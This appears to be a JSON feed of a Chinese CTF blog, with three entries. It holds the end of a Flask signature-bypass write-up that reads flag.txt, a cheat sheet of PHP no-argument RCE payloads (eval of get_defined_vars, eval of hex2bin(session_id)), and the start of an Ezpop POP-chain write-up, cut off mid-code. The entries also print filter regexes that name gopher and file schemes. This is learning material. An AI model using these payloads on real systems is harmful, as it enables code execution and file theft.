class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\t\t\t\t<span class=\"token comment\">#检查，然后如果有 scan，就把东西写到 result.txt</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token string\">\"scan\"</span> <span class=\"token keyword\">in</span> self<span class=\"token punctuation\">.</span>action<span class=\"token punctuation\">:</span>\t\t<span class=\"token comment\">#如果有 read，就读 result.txt；由此可知，俩都得有才行</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                tmpfile <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./%s/result.txt\"</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>sandbox<span class=\"token punctuation\">,</span> <span class=\"token string\">'w'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                resp <span class=\"token operator\">=</span> scan<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>param<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>resp <span class=\"token operator\">==</span> <span class=\"token string\">\"Connection Timeout\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                    result<span class=\"token punctuation\">[</span><span class=\"token string\">'data'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> resp</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                    <span class=\"token keyword\">print</span> resp</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                    tmpfile<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                    tmpfile<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>                result<span class=\"token punctuation\">[</span><span class=\"token string\">'code'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">200</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token string\">\"read\"</span> <span class=\"token keyword\">in</span> self<span class=\"token punctuation\">.</span>action<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./%s/result.txt\"</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>sandbox<span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>                result<span class=\"token punctuation\">[</span><span class=\"token string\">'code'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">200</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>                result<span class=\"token punctuation\">[</span><span class=\"token string\">'data'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            <span class=\"token keyword\">if</span> result<span class=\"token punctuation\">[</span><span class=\"token string\">'code'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">500</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                result<span class=\"token punctuation\">[</span><span class=\"token string\">'data'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Action Error\"</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            result<span class=\"token punctuation\">[</span><span class=\"token string\">'code'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">500</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            result<span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Sign Error\"</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">return</span> result</pre></td></tr><tr><td data-num=\"51\"></td><td><pre> </pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">checkSign</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\t\t\t\t\t<span class=\"token comment\">#检查可以看出是调用了 getsign，看是否和 sign 相等</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>getSign<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>action<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>param<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> self<span class=\"token punctuation\">.</span>sign<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre> </pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/geneSign\"</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\t\t\t\t<span class=\"token comment\">#路径之一，可以传参 param，让 action 默认成 scan</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">geneSign</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    param <span class=\"token operator\">=</span> urllib<span class=\"token punctuation\">.</span>unquote<span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"param\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    action <span class=\"token operator\">=</span> <span class=\"token string\">\"scan\"</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token keyword\">return</span> getSign<span class=\"token punctuation\">(</span>action<span class=\"token punctuation\">,</span> param<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre> </pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/De1ta'</span><span class=\"token punctuation\">,</span>methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\t\t\t\t\t\t<span class=\"token comment\">#路径之一，可以通过 cookie 传参 action 和 sign</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">challenge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"token comment\">#可以通过 get 传参 param，后面有个 waf 没啥用</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    action <span class=\"token operator\">=</span> urllib<span class=\"token punctuation\">.</span>unquote<span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>cookies<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"action\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    param <span class=\"token operator\">=</span> urllib<span class=\"token punctuation\">.</span>unquote<span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"param\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    sign <span class=\"token operator\">=</span> urllib<span class=\"token punctuation\">.</span>unquote<span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>cookies<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"sign\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    ip <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>remote_addr</pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>waf<span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"No Hacker!!!!\"</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    task <span class=\"token operator\">=</span> Task<span class=\"token punctuation\">(</span>action<span class=\"token punctuation\">,</span> param<span class=\"token punctuation\">,</span> sign<span class=\"token punctuation\">,</span> ip<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token keyword\">return</span> json<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>task<span class=\"token punctuation\">.</span>Exec<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre> </pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"code.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\t\t\t\t\t\t\t<span class=\"token comment\">#根目录，显示原码用的</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre> </pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">scan</span><span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"token comment\">#scan，配合上面那个扫描文件读取文件用，不管</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    socket<span class=\"token punctuation\">.</span>setdefaulttimeout<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        <span class=\"token keyword\">return</span> urllib<span class=\"token punctuation\">.</span>urlopen<span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">50</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"Connection Timeout\"</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre> </pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getSign</span><span class=\"token punctuation\">(</span>action<span class=\"token punctuation\">,</span> param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>·\t\t\t\t\t\t\t\t\t<span class=\"token comment\">#配合上面使用，把三个东西拼接起来（直接拼接）md5</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token keyword\">return</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span>secert_key <span class=\"token operator\">+</span> param <span class=\"token operator\">+</span> action<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#显然这里需要利用，来绕过前面的判断 checkSign</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre> </pre></td></tr><tr><td data-num=\"89\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    <span class=\"token keyword\">return</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre> </pre></td></tr><tr><td data-num=\"92\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">waf</span><span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>    check<span class=\"token operator\">=</span>param<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\t\t\t\t\t\t\t\t\t<span class=\"token comment\">#不能出现这俩字符，没啥用</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    <span class=\"token keyword\">if</span> check<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">\"gopher\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> check<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">\"file\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>    app<span class=\"token punctuation\">.</span>debug <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>host<span class=\"token operator\">=</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">,</span>port<span class=\"token operator\">=</span><span class=\"token number\">9999</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>（我在代码上标注了一下自己的理解）</p>\n<p>整个代码是要读拼接后的 param，方法是靠 action，来获取 flag.txt</p>\n<p>就是让我们 action=readscan 或者 scanread，只要包含就行，然后文件 param=flag.txt 就能读，只要 sign = 拼接后的 md5 值就行。</p>\n<p>而 sign 在 genesign 里构造就行，让 param=flag.txtread，action 默认赋值 scan 不用管，这样拼接起来就是是需要的 sign，既有 scan 又有 read</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMTYvNWZCdEUzVXF4WTdqZWM4LnBuZw==\">https://i.loli.net/2021/08/16/5fBtE3UqxY7jec8.png</span>&quot; alt=&quot;2.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<p>读取了 sign 后，抓包改 cookie 值传参，通过路径 / De1ta，就正常传就出来了</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMTYvMWk4WUFIM2d0enhkdjdCLnBuZw==\">https://i.loli.net/2021/08/16/1i8YAH3gtzxdv7B.png</span>&quot; alt=&quot;3.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>说实话，思路确实不难，主要就是记录一下代码，梳理下代码。</p>\n<hr>\n<p>有不懂的代码再补充</p>\n<p>END</p>\n",
            "tags": [
                "代码审计"
            ]
        },
        {
            "id": "http://example.com/2021/08/13/ctfweb-%E6%97%A0%E5%8F%82RCE/",
            "url": "http://example.com/2021/08/13/ctfweb-%E6%97%A0%E5%8F%82RCE/",
            "title": "ctfweb-无参RCE",
            "date_published": "2021-08-13T10:49:41.433Z",
            "content_html": "<p>最近做题遇到了几道无参数 RCE 的题，基本上还是不会，在此总结一下 payload</p>\n<p><span id=\"more\"></span></p>\n<hr>\n<p><strong>常见提示：</strong></p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/[^\\W]+\\((?R)?\\)/'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span> $_GET<span class=\"token punctuation\">[</span><span class=\"token string\">'xxx'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>有这种屏蔽的，一般都是无参数 rce：</p>\n<ul>\n<li>(?R) 引用当前表达式，后面加了？递归调用。允许执行类似 <code>a(b(c()))</code>  格式的无参数函数；</li>\n</ul>\n<hr>\n<p><strong>常见方法：</strong></p>\n<p>1.<em> 查看当前目录下的文件</em></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">pos</span><span class=\"token punctuation\">(</span><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">#pos () 函数可以替换为 current () 函数，一个意思</span></pre></td></tr></table></figure><p>2.<em> 暴露出数组中文件的名字，方便用函数读取</em></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_rand</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_flip</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">pos</span><span class=\"token punctuation\">(</span><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">#原理就是随机生成键并反转，让名字暴露出来</span></pre></td></tr></table></figure><p>3.<em> 读取文件</em></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">file</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">readfile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">#都可以试试</span></pre></td></tr></table></figure><p>4.<em> 进行命令执行输入</em></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token function\">current</span><span class=\"token punctuation\">(</span><span class=\"token function\">get_defined_vars</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>b<span class=\"token operator\">=</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>get_defined_vars (void) ，此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量等</li>\n<li>curren () ，用于初始指向插入到数组中的第一个单元。</li>\n<li>end ()，作用是将 array 的内部指针移动到最后一个单元并返回其值。</li>\n<li>然后 eval () 执行命令即可。</li>\n</ul>\n<p>5.<em> 用 http headers 头部的 session 的函数获取 flag</em></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token function\">hex2bin</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_id</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>配合 burp 即可，把要执行的代码 16 进制后输入 phpsessid</p>\n<hr>\n<p>后续遇到新的再补充</p>\n<p>END</p>\n",
            "tags": [
                "RCE"
            ]
        },
        {
            "id": "http://example.com/2021/08/10/(ctfwp)%E5%87%A0%E9%81%93%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E7%9A%84%E9%A2%98(POP%E9%93%BE%E3%80%81%E9%80%83%E9%80%B8)/",
            "url": "http://example.com/2021/08/10/(ctfwp)%E5%87%A0%E9%81%93%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E7%9A%84%E9%A2%98(POP%E9%93%BE%E3%80%81%E9%80%83%E9%80%B8)/",
            "title": "(ctfwp)几道序列化相关的题(POP链、逃逸)",
            "date_published": "2021-08-10T15:44:31.014Z",
            "content_html": "<p>记录两道实在不会的题，研究了好半天，算是涨姿势了</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"1mrctf2020ezpop\"><a class=\"anchor\" href=\"#1mrctf2020ezpop\">#</a> 1.[MRCTF2020]Ezpop</h1>\n<p>这道题考察 pop 链，题目中还给了教程，提示的很明显。</p>\n<p>第一次遇到这种题，虽说不是难题，但也没个了解，查了下 wp，</p>\n<p>发现写的都很难懂，解释的很牵强（感觉都出自几个大佬，所以写的很简）</p>\n<p>索性我就自己摸索，搞了大半天终于明白了，遂在这里记录一下。</p>\n<hr>\n<p>先放原码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> Modifier <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">protected</span>  <span class=\"token variable\">$var</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$source</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'index.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Welcome to '</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">str</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/gopher|http|file|ftp|https|dict|\\.\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token 